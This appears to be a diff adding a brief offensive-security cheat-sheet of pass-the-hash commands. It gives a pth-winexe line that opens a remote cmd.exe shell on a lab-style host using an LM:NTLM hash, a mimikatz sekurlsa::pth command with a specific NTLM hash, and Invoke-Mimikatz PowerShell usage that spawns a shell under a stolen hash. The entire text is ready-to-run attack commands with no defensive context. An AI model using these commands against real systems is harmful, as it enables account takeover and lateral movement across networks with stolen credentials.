@@ -1,0 +1,11 @@
+
+Typical connections
+
+> pth-winexe  -U WORKGROUP/paco%'aad3b435b51404eeaad3b435b51404ee:63485d30576a1a741106e3e800053b34' //10.10.10.63 cmd.exe 
+
+> PS> .\mimikatz.exe "sekurlsa::pth /user:JoeD /domain:domain.com /ntlm:eed224b4784bb040aab50b8856fe9f02"
+
+# Powershell
+> Import-Module .\Invoke-Mimikatz.ps1
+
+> Invoke-Mimikatz -Command '"sekurlsa::pth /user:UserName /domain:DomainName /ntlm:HASH /run:powershell.exe"'
